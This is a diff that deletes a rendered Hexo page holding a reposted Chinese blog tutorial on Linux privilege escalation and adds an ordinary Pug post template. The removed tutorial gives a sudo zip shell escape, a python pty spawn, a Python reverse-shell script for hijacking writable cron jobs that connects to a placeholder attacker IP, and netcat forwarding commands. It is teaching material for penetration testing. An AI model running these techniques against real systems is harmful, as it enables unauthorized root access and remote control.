@@ -1,713 +1,107 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-
-  
-<head>
-  <meta charset="utf-8">
-  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
-  
-  
-  
-  <title>Linux提权方式总结 | skyeの博客</title>
-
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-
-  
-    <meta name="keywords" content="Linux提权," />
-  
-
-  <script>
-    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
-  </script>
-
-  
-    <meta name="description" content="斯是陋室,惟吾德馨">
-  
-
-  
-
-  
-    <link rel="icon" href="/images/pika.jpg">
-    <link rel="apple-touch-icon" href="/images/pika.jpg">
-  
-
-  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
-  
-<link rel="stylesheet" href="/css/base.css">
-<link rel="stylesheet" href="/icon/iconfont.css">
-<link rel="stylesheet" href="/css/github-markdown.css">
-<link rel="stylesheet" href="/css/highlight.css">
-
-
-  
-<script src="/js/util.js"></script>
-<script src="/js/valine.min.js"></script>
-
-
-  
-    
-<link rel="stylesheet" href="/images/custom.styl.css">
-
-  
-
-  
-    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
-    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
-  
-
-  
-    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
-  
-  
-  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
-  
-  
-    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
-  
-
-<meta name="generator" content="Hexo 4.2.0"></head>
-
-  <body>
-
-    
-
-    <div id="app">
-
-      <div class="header-wrap">
-  <header>
-    <div class="site-brand">
-      <div class="site-title">
-        <a href="/">斯是陋室 唯吾独馨</a>
-      </div>
-    </div>
-    <nav class="site-navigation">
-      <ul class="nav-menu">
-      
-        <li class="nav-item" data-path="/">
-          
-            <a 
-              href="/"
-              target="_self"
-            >
-              主页
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="/archives/">
-          
-            <a 
-              href="/archives/"
-              target="_self"
-            >
-              归档
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="/categories/">
-          
-            <a 
-              href="/categories/"
-              target="_self"
-            >
-              分类
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="/tags/">
-          
-            <a 
-              href="/tags/"
-              target="_self"
-            >
-              标签
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="/friends/">
-          
-            <a 
-              href="/friends/"
-              target="_self"
-            >
-              友链
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="/about/">
-          
-            <a 
-              href="/about/"
-              target="_self"
-            >
-              关于
-            </a>
-          
-        </li>
-      
-        <li class="nav-item" data-path="">
-          
-            <a href="javascript:void(0);" v-else>抓到我</a>
-            <ul class="nav-menu--dropdown">
-              
-                <li>
-                  <a 
-                    href="https://github.com/forever-sky" 
-                    target="_blank"
-                  >
-                    Github
-                  </a>
-                </li>
-              
-                <li>
-                  <a 
-                    href="/244567547" 
-                    target="_blank"
-                  >
-                    qq
-                  </a>
-                </li>
-              
-                <li>
-                  <a 
-                    href="https://blog.csdn.net/qq_42188168" 
-                    target="_blank"
-                  >
-                    csdn
-                  </a>
-                </li>
-              
-            </ul>
-          
-        </li>
-      
-      </ul>
-    </nav>
-    <i class="iconfont icon-menu"></i>
-  </header>
-</div>
-
-<script>
-  let links = document.querySelectorAll('.nav-item');
-  for(let link of links){
-    let childrenLink = link.querySelector('ul');
-    link.addEventListener('mouseenter', () => {
-      if(childrenLink) {
-        childrenLink.className = "nav-menu--dropdown active";
-      }
-    })
-    link.addEventListener('mouseleave', () => {
-      if(childrenLink) {
-        childrenLink.className = "nav-menu--dropdown";
-      }
-    })
-  }
-  let rootRealPath = getRealPath(window.location.pathname, true);
-  for(let link of links) {
-    let linkPath = link.getAttribute("data-path");
-    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
-      link.className = "nav-item hover";
-    }
-  }
-
-  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
-    iconMenuClicked = false;
-  let navDOM = document.querySelector("nav.site-navigation");
-  iconMenu.addEventListener("click", () => {
-    iconMenuClicked 
-      ? navDOM.className = "site-navigation active"
-      : navDOM.className = "site-navigation";
-    iconMenuClicked = !iconMenuClicked;
-  })
-</script>
-
-      
-
-
-
-
-
-
-
-
-<div class="container post-index">
-
-  
-
-<div class="post">
-  <h1 class="article-title">
-    <span>Linux提权方式总结</span>
-  </h1>
-  <div class="article-top-meta">
-    <span>
-      发布 : 
-      2020-03-27
-    </span>
-    
-      <span>
-        分类 : 
-          <a href="/categories/Linux%E6%8F%90%E6%9D%83/">
-            Linux提权
-          </a>
-      </span>
-    
-    
-      <span>
-        浏览 : <span class="article-timer" data-identity="【转载】Linux 提权方式总结"></span>
-      </span>
-    
-  </div>
-
-  
-
-  <div class="article-content">
-    <div class="markdown-body">
-      <p><a href="https://cloud.tencent.com/developer/article/1544037">https://cloud.tencent.com/developer/article/1544037</a></p>
-<h2 id="一、补充"><a href="#一、补充" class="headerlink" title="一、补充"></a><strong>一、补充</strong></h2><h3 id="1、利用zip提权"><a href="#1、利用zip提权" class="headerlink" title="1、利用zip提权"></a>1、利用zip提权</h3><p>使用sudo -l 查看当前用户可以使用的root提权命令信息，发现可以执行tar和zip相关命令。<br>touch exploit<br>sudo -u root zip exploit.zip exploit -T –unzip-command=”sh -c /bin/bash”</p>
-<h3 id="2、密码复用补充"><a href="#2、密码复用补充" class="headerlink" title="2、密码复用补充"></a>2、密码复用补充</h3><p>管理员可能会设置重复使用的密码，因此可能数据库或者web后台的密码就是root密码</p>
-<p>拥有疑似root的秘密可以尝试ssh登录，若禁止root登录或被防火墙挡住，我们就想办法在低权限上输入密码，当然一般情况下linux会要求用户必须从终端设备（tty）中输入密码，禁止标准输入，sudo常常不能使用<br>因此我们可以用python模拟一个终端  python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
-<h3 id="3、利用定时计划任务"><a href="#3、利用定时计划任务" class="headerlink" title="3、利用定时计划任务"></a>3、利用定时计划任务</h3><h4 id="补充1："><a href="#补充1：" class="headerlink" title="补充1："></a>补充1：</h4><p>通过查看 /etc/crontab 文件，查看其他用户是否有设定的系统定时任务，并查看对应对应任务内容，执行的任务肯定时对靶场机器的某个文件。</p>
-<p>/etc/crontab 文件是用来设定系统定期执行任务，需要root权限，不同用户都可以有不同定时任务，如果在 /etc/crontab 下有某个用户执行的定时计划文件，但是具体目录下没有这个定时执行的文件，可以自行创建反弹shell ，用创建的脚本替换原来的py脚本，netcat执行监听获得对应用户的权限</p>
-<p>如果有定时执行任务的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,subprocess,socket</span><br><span class="line"> </span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">"攻击机ip地址"</span>,<span class="string">"攻击机监听端口"</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess([<span class="string">"/bin/sh"</span>,<span class="string">"-i "</span>])</span><br></pre></td></tr></table></figure>
-
-<h4 id="补充2："><a href="#补充2：" class="headerlink" title="补充2："></a>补充2：</h4><p>系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是/etc/内系统的计划任务可以被列出</p>
-<p>ls -l /etc/cron*</p>
-<p>默认这些程序以root权限执行，如果有幸遇到一个把其中脚本配置成任意用户可写的管理员，我们就可以修改脚本等回连rootshell了。</p>
-<h3 id="4、网络与隐藏服务"><a href="#4、网络与隐藏服务" class="headerlink" title="4、网络与隐藏服务"></a>4、网络与隐藏服务</h3><p>有一些服务器的服务会被配置成对内网或者对本机开放。通过对他们的攻击我们有机会接触更多的敏感文件，或是运气足够好碰上一个远程root漏洞。</p>
-<p>netstat -antup#查看各种网络服务</p>
-<p>如果找到些神秘的服务，可以用netcat做个转发</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo backpipe</span><br><span class="line">nc -l 8082 0&lt;backpipe | nc remote_host 445 1&gt;backpipe</span><br></pre></td></tr></table></figure>
-<p>之后找漏洞，攻击，从头再来。</p>
-<h2 id="二、Linux错误配置检查"><a href="#二、Linux错误配置检查" class="headerlink" title="二、Linux错误配置检查"></a>二、Linux错误配置检查</h2><h3 id="1、linuxprivchecker-py"><a href="#1、linuxprivchecker-py" class="headerlink" title="1、linuxprivchecker.py"></a>1、linuxprivchecker.py</h3><h3 id="2、http-pentestmonkey-net-tools-audit-unix-privesc-check"><a href="#2、http-pentestmonkey-net-tools-audit-unix-privesc-check" class="headerlink" title="2、http://pentestmonkey.net/tools/audit/unix-privesc-check"></a>2、<a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">http://pentestmonkey.net/tools/audit/unix-privesc-check</a></h3><h3 id="3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation"><a href="#3、手动检查-https-blog-g0tmi1k-com-2011-08-basic-linux-privilege-escalation" class="headerlink" title="3、手动检查 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"></a>3、手动检查 <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></h3>
-    </div>
-  </div>
-  
-    <div class="copy-right">
-      <div class="markdown-body">
-        <blockquote>
-        
-        
-          本文作者 : skye <br/>
-        
-        原文链接 : <a href="">http://forever-sky.github.io/2020/03/27/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91Linux%20%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a><br>
-        版权声明 : 本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
-        </blockquote>
-      </div>
-    </div>
-  
-  
-  
-    <div class="social-share"
-  style="margin-top: -2rem"
-  data-wechat-qrcode-title="<p>微信扫一扫</p>"
-  data-wechat-qrcode-helper="<p>微信右上角, 扫一扫分享</p>"
-   data-sites="qzone, qq, weibo, wechat, douban, google, facebook, twitter" 
-  
->
-  <span style="color: #6b7487; font-size: 1.4rem;">分享到: </span>
-</div>
-<script src="https://cdn.bootcss.com/social-share.js/1.0.16/js/social-share.min.js" async>
-  
-
-  
-    <div id="reward">
-  
-    <p id="reward-meta">知识 & 情怀 | 二者兼得</p>
-  
-  <button id="reward-btn">
-    
-    <span>投食</span>
-  </button>
-  <div id="reward-qrcode">
-    
-      <div class="reward-qrcode--container">
-        <img class="qrcode-img" src="/images/wechat.png" alt="微信扫一扫, 向我投食">
-        <p class="qrcode-meta">微信扫一扫, 向我投食</p>
-      </div>
-    
-      <div class="reward-qrcode--container">
-        <img class="qrcode-img" src="/images/alipay.png" alt="支付宝扫一扫, 向我投食">
-        <p class="qrcode-meta">支付宝扫一扫, 向我投食</p>
-      </div>
-    
-  </div>
-
-</div>
-
-<script>
-  (() => {
-    let button = document.querySelector('#reward-btn'),
-      qrcode = document.querySelector('#reward-qrcode'),
-      display = false;
-    
-    button.addEventListener('click', () => {
-      qrcode.style.display = display ? 'none' : 'block'
-      display = !display
-    }, false)
-  })()
-</script>
-  
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-      <span>
-        
-      </span>
-    </div>
-    <div class="article-meta pull-right">
-    </div>
-  </div>
-</div>
-
-
-  <aside id="sidebar">
-    <p id="sidebar-header"></p>
-    <ol id="sidebar-toc"></ol>
-  </aside>
-  <script async>setTimeout(generateToc, 10);</script>
-
-
-  <nav class="post-navigation">
-    
-      <div class="nav-pre">
-        <i class="iconfont icon-prev"></i>
-        上一篇:
-        <a href="/2020/03/27/%E6%8F%90%E6%9D%83------_iis6.exe%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83/" target="_self">提权------_iis6.exe溢出提权</a>
-      </div>
-    
-    
-  </nav>
-
-  
-    <a href="#comment" class="comment-anchor"></a>
-<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
-<div id="vcomments"></div>
-
-<script defer>
-  if( true ) {
-    let path = getRealPath()
-    new Valine({
-      el: "#vcomments",
-      appId: "tuVbCvzf28wjrChEx7wuCX6b-gzGzoHsz",
-      appKey: "fxuHTXwaFtdx5WupGo3QdyVD",
-      notify: false,
-      verify: false,
-      avatar: "robohash",
-      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
-      path
-    });
-  }
-</script>
-   
-
-  
-    <script defer>
-const valineAPI = (() => {
-  try {
-    AV.init("tuVbCvzf28wjrChEx7wuCX6b-gzGzoHsz", "fxuHTXwaFtdx5WupGo3QdyVD");
-  } catch(error) {}
-  const isExist = (identity) => {
-    identity = identity || getRealPath();
-    let query = new AV.Query('Timer');
-    return new Promise((resolve, reject) => {
-      query.equalTo("identity", identity);
-      query.find().then(results => {
-        resolve(results.length > 0);
-      }, error => reject(error));
-    })
-  }
-
-  const _get = (identity) => {
-    let query = null;
-    if(identity && identity instanceof Array){
-      let querys = [];
-      for(let i = 0; i < identity.length; ++i) {
-        querys[i] = new AV.Query('Timer');
-        querys[i].equalTo('identity', identity[i]);
-      }
-      query = AV.Query.or.apply(null ,querys);
-    } else {
-      identity = identity || getRealPath();
-      query = new AV.Query("Timer");
-      query.equalTo("identity", identity);
-    }
-
-    return new Promise((resolve, reject) => {
-      query.find()
-      .then(results => resolve(results))
-      .catch(error => reject(error))
-    })
-  }
-
-  const create = (identity) => {
-    identity = identity || getRealPath();
-    return new Promise((resolve, reject) => {
-      let Todo = AV.Object.extend('Timer');
-      let todo = new Todo();
-      todo.set("times", 1);
-      todo.set("identity", identity);
-      todo.save().then(res => resolve(true), error => reject(error));
-    })
-  }
-
-  const update = (identity) => {
-    identity = identity || getRealPath();
-    return new Promise((resolve, reject) => {
-      let query = new AV.Query('Timer');
-      query.equalTo("identity", identity);
-      query.find().then(todos => {
-        todos.forEach(todo => {
-          todo.set("times", todo.attributes.times + 1);
-        });
-        return AV.Object.saveAll(todos);
-      }).then(todos => resolve(true), error => reject(error));
-    })
-  }
-
-  return {
-    isExist,
-    _get,
-    update,
-    create
-  }
-})()
-
-const calcAndWriteTimes = () => {
-  let isPost = true;
-
-  let timerAllDOM = document.querySelectorAll(".article-timer");
-
-  if(isPost) {
-    let identity = timerAllDOM[0].getAttribute("data-identity");
-    valineAPI.isExist(identity)
-    .then(exist => {
-      if(exist) {
-        return valineAPI.update(identity);
-      }
-      return new Promise(resolve => resolve(true));
-    })
-    .then( succuess => valineAPI._get(identity))
-    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
-    .catch(error => console.log(error.message))
-    return ;
-  }
-
-  let timerDOMCache = {};
-
-  for(let timerDOM of timerAllDOM) {
-    let identity = timerDOM.getAttribute("data-identity");
-    if(timerDOMCache.hasOwnProperty(identity)){
-      timerDOMCache[identity].dom.push(timerDOM);
-    }else{
-      timerDOMCache[identity] = {
-        dom: [timerDOM],
-        times: undefined
-      };
-    }
-  }
-
-  let identities = Object.keys(timerDOMCache);
-  valineAPI._get(identities).then(results => {
-    for(let result of results) {
-      let {identity, times} = result.attributes;
-      timerDOMCache[identity].times = times;
-      timerDOMCache[identity].dom.map(item => item.innerText = times);
-    }
-    for(let identity of identities) {
-      if(timerDOMCache[identity].times){
-        continue;
-      }
-      timerDOMCache[identity].dom.map(item => item.innerText = 1);
-      valineAPI.create(identity);
-    }
-  }).catch(error => console.log(error.message))
-}
-
-if(true){
-  calcAndWriteTimes();
-}
-</script>
-   
-
-</div>
-
-
-      <footer>
-  <p class="site-info">
-    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
-    <br>
-    Theme - <a href="https://github.com/dongyuanxin/theme-bmw">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/">GodBMW</a>
-    <br>
-    
-  </p>
-</footer>
-
-
-
-<script>
-const timeToNowDOM = document.querySelector("#time-to-now");
-const startTimestamp = new Date(2020, 1, 10).getTime();
-
-const updateTimeStr = () => {
-  let offset = parseInt(
-      (new Date().getTime() - startTimestamp) / 1000,
-      10
-    ),
-    day = Math.floor(offset / 86400),
-    hour = Math.floor((offset % 86400) / 3600),
-    minute = Math.floor(((offset % 86400) % 3600) / 60),
-    second = Math.floor(((offset % 86400) % 3600) % 60);
-  timeToNowDOM.innerHTML =
-    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
-  setTimeout(updateTimeStr, 500);
-}
-
-setTimeout(updateTimeStr, 500);
-</script>
-
-
-      <div class="back-to-top hidden">
-  <span>
-    <i class="iconfont icon-60"></i><span></span>%
-  </span>
-</div>
-
-<script>
-const updateIconToTop = percent => {
-  let dom = document.querySelector(".back-to-top span span");
-  dom.innerText = percent;
-  if(percent < 1) {
-    document.querySelector(".back-to-top").className = "back-to-top hidden";
-  } else {
-    document.querySelector(".back-to-top").className = "back-to-top";
-  }
-}
-
-const handleScoll = () => {
-  let isRunning = false;
-  return () => {
-    if (isRunning) return;
-    isRunning = true;
-    window.requestAnimationFrame(timestamp => {
-      let scrollTop =
-          document.documentElement.scrollTop || document.body.scrollTop,
-        scrollHeight =
-          document.documentElement.scrollHeight ||
-          document.body.scrollHeight,
-        clientHeight =
-          document.documentElement.clientHeight ||
-          document.body.clientHeight;
-      isRunning = false;
-      if (scrollTop <= 1) {
-        updateIconToTop(0);
-        return;
-      }
-      if (scrollTop + clientHeight >= scrollHeight) {
-        updateIconToTop(100);
-      } else {
-        updateIconToTop(parseInt(
-          100 * scrollTop / (scrollHeight - clientHeight),
-          10
-        ));
-      }
-    });
-  };
-}
-
-const backToTop = () => {
-  let scrollTop =
-      document.documentElement.scrollTop || document.body.scrollTop,
-    delay = 10,
-    time = 200;
-  if (scrollTop <= 20) {
-    document.documentElement.scrollTop = 0;
-    document.body.scrollTop = 0;
-    return;
-  }
-  let step = Math.ceil(scrollTop * delay / time);
-  let timer = setInterval(() => {
-    scrollTop =
-      document.documentElement.scrollTop || document.body.scrollTop;
-    if (scrollTop - step <= 0) {
-      document.documentElement.scrollTop = 0;
-      document.body.scrollTop = 0;
-      clearInterval(timer);
-    } else {
-      document.documentElement.scrollTop = scrollTop - step;
-      document.body.scrollTop = scrollTop - step;
-    }
-  }, delay);
-}
-
-document.addEventListener("scroll", handleScoll(), false);
-
-document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
-
-</script>
-
-    </div>
-
-    
-      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
-<script>
-  (() => {
-    const mathjaxConfig = {
-      showProcessingMessages: false, //关闭js加载过程信息
-      messageStyle: "none", //不显示信息
-      jax: ["input/TeX", "output/HTML-CSS"],
-      tex2jax: {
-        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
-        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
-        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
-      },
-      "HTML-CSS": {
-        availableFonts: ["STIX", "TeX"], //可选字体
-        showMathMenu: false //关闭右击菜单显示
-      }
-    }
-
-    let mathjaxInterval = setInterval(() => {
-      if(!window.MathJax){
-        return;
-      }
-      window.MathJax.Hub.Config(mathjaxConfig)
-      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
-
-      clearInterval(mathjaxInterval)
-    }, 10)    
-  })()
-</script>
-    
-
-    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
-<script async>
-  let fancyTimer = setInterval(function(){
-    if(!window.$){
-      return;
-    }
-    $(document).ready(function() {
-      $(".post img").each(function () {
-        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
-          return;
-        }
-        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "gallery");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      });
-      
-      clearInterval(fancyTimer);
-    });
-  }, 10);
-</script>
-
-    
-  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
-
-</html>
+extends includes/layout.pug
+
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
+
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
